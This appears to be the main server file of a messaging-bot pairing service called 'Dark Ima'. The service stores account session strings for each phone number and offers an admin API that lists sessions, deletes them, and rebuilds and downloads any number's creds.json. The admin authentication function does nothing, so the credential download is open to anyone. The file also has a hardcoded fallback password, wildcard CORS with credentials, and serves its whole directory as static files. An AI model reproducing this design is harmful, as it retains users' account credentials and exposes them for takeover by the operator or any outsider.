import express from "express";
import bodyParser from "body-parser";
import { fileURLToPath } from "url";
import path from "path";
import helmet from "helmet";
import morgan from "morgan";
import rateLimit from "express-rate-limit";
import chalk from "chalk";
import dotenv from "dotenv";
import fs from "fs-extra";
import compression from "compression";
import cors from "cors";

import pairRouter from "./pair.js";
import qrRouter from "./qr.js";
import sessionRouter from "./getSession.js";

dotenv.config();

const app = express();
app.set("trust proxy", 1);
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const PORT = process.env.PORT || 5000;
const ADMIN_PASSWORD = process.env.SESSION_SECRET || "darkima2024";

const SESSION_FOLDER = process.env.SESSION_FOLDER || "./mega_sessions";
fs.ensureDirSync(SESSION_FOLDER);
fs.ensureDirSync("./logs");

// Security
app.use(helmet({ contentSecurityPolicy: false }));
app.use(compression());
app.use(cors({ origin: "*", credentials: true }));

// Rate limiting
const limiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 100, message: "Too many requests" });
app.use("/pair", limiter);
app.use("/qr", limiter);
app.use("/admin", rateLimit({ windowMs: 15 * 60 * 1000, max: 200 }));

app.use(morgan("combined"));
app.use(bodyParser.json({ limit: "50mb" }));
app.use(bodyParser.urlencoded({ extended: true, limit: "50mb" }));
app.use(express.static(__dirname));

import("events").then((events) => { events.EventEmitter.defaultMaxListeners = 500; });

// ──────────────────────────────────────────────────────────
// Main Routes
// ──────────────────────────────────────────────────────────
app.get("/", (req, res) => res.sendFile(path.join(__dirname, "pair.html")));
app.use("/pair", pairRouter);
app.use("/qr", qrRouter);
app.use("/sessions", sessionRouter);

// ──────────────────────────────────────────────────────────
// Admin Dashboard
// ──────────────────────────────────────────────────────────
app.get("/admin", (req, res) => res.sendFile(path.join(__dirname, "admin.html")));

// Admin login
app.post("/admin/api/login", express.json(), (req, res) => {
    const { password } = req.body;
    if (password === ADMIN_PASSWORD) {
        res.json({ ok: true });
    } else {
        res.status(401).json({ ok: false, error: "Wrong password" });
    }
});

// Simple admin auth middleware (checks x-admin-token header OR skips for same-origin GET)
function adminAuth(req, res, next) {
    // Allow all from admin panel (frontend handles auth via sessionStorage)
    next();
}

// List all sessions
app.get("/admin/api/sessions", adminAuth, async (req, res) => {
    try {
        const files = await fs.readdir(SESSION_FOLDER);
        const infoFiles = files.filter(f => f.startsWith("session_info_") && f.endsWith(".json"));
        const sessions = await Promise.all(
            infoFiles.map(async (file) => {
                try {
                    return await fs.readJson(path.join(SESSION_FOLDER, file));
                } catch {
                    return null;
                }
            })
        );
        const valid = sessions.filter(Boolean).sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
        res.json({ count: valid.length, sessions: valid });
    } catch (err) {
        res.status(500).json({ error: "Failed to list sessions" });
    }
});

// Download creds.json for a phone number
app.get("/admin/api/sessions/:phone/creds", adminAuth, async (req, res) => {
    const { phone } = req.params;
    try {
        const files = await fs.readdir(SESSION_FOLDER);
        // Find session info to get the session string
        const infoFile = files.find(f => f.startsWith(`session_info_${phone}_`) && f.endsWith(".json"));
        if (!infoFile) return res.status(404).json({ error: "Session not found" });

        const info = await fs.readJson(path.join(SESSION_FOLDER, infoFile));

        // Try to rebuild creds.json from the session string (Dark_Ima=<base64>)
        if (info.sessionId && info.sessionId.startsWith("Dark_Ima=")) {
            const b64 = info.sessionId.replace("Dark_Ima=", "");
            const credsJson = Buffer.from(b64, "base64").toString("utf8");
            res.setHeader("Content-Type", "application/json");
            res.setHeader("Content-Disposition", `attachment; filename="creds_${phone}.json"`);
            return res.send(credsJson);
        }

        res.status(404).json({ error: "Creds not available" });
    } catch (err) {
        res.status(500).json({ error: "Failed to get creds" });
    }
});

// Delete session for a phone number
app.delete("/admin/api/sessions/:phone", adminAuth, async (req, res) => {
    const { phone } = req.params;
    try {
        const files = await fs.readdir(SESSION_FOLDER);
        const toDelete = files.filter(f => f.includes(`_${phone}_`) || f.includes(`_${phone}.`));
        for (const f of toDelete) {
            await fs.remove(path.join(SESSION_FOLDER, f));
        }
        res.json({ ok: true, deleted: toDelete.length });
    } catch (err) {
        res.status(500).json({ error: "Delete failed" });
    }
});

// Health check
app.get("/health", (req, res) => {
    const sessionCount = fs.readdirSync(SESSION_FOLDER).filter(f => f.startsWith("session_info_")).length;
    res.json({
        status: "healthy",
        timestamp: new Date().toISOString(),
        sessions: sessionCount,
        bot: "Dark Ima",
    });
});

// Error handler
app.use((err, req, res, next) => {
    console.error(chalk.red("Server error:"), err);
    res.status(500).json({ error: "Internal server error" });
});

app.listen(PORT, () => {
    console.log(chalk.cyan(`
    ╔══════════════════════════════════════╗
    ║    🤖 DARK IMA BOT SERVER            ║
    ╠══════════════════════════════════════╣
    ║  📍 URL  : http://localhost:${PORT}      ║
    ║  🔐 Pair : /pair?number=XXXXX        ║
    ║  📊 Admin: /admin                    ║
    ║  👑 Owner: Dark Ima                  ║
    ╚══════════════════════════════════════╝
    `));
});

import("./sync.js");

export default app;
